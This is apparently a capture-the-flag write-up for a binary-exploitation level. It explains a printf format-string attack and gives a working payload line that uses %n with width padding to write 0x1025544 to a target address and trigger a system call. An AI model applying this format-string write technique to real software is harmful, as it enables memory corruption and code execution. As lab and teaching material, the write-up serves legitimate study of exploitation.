### Level 4

#### Basic Recon

again there's call to printf and there's those functions `n` and `p` maybe there's something going on there.

there's that `system` function call in `n` that's our target now.

and it is the same argument that `p` will use

now I want p to store the value `0x1025544` in the location 
`0x8049810`

well we may print that list of charcters `0x1025544` to exact well that's a lot and other probelm printf will start printing our input, but our input can not be big, because we are using `fgets` instead of `gets`, but hold on who says that we need to input that long string we can ask print to print that big string as list of string like this

```c
#include <stdio.h>

int main()
{
    int a = 9;

    printf("%10d", a);
}
```

as you can see it will fill the rest with spaces

```sh
python -c "from __future__ import print_function; print('\x10\x98\x04\x08' + '%16930112d%12\$n')"
```

why `16930112` well this is just `0x1025544-4` and that 4 is the first 4 characters which represent the address

#### Ideas that I tried

well I tried to write each byte separately how? well the idea is to put 4 address on the stack so printf would use them to store what was printed so that means I tried to write the bytes `0x01` `0x02` `0x55` `0x44`, but the problem is when I tried it's hard to write the first byte `0x01`, because printf should write the value 1 in the first location but that's not possible because the smallest value that printf can write in this case is 4, 4 because that the size of the first location
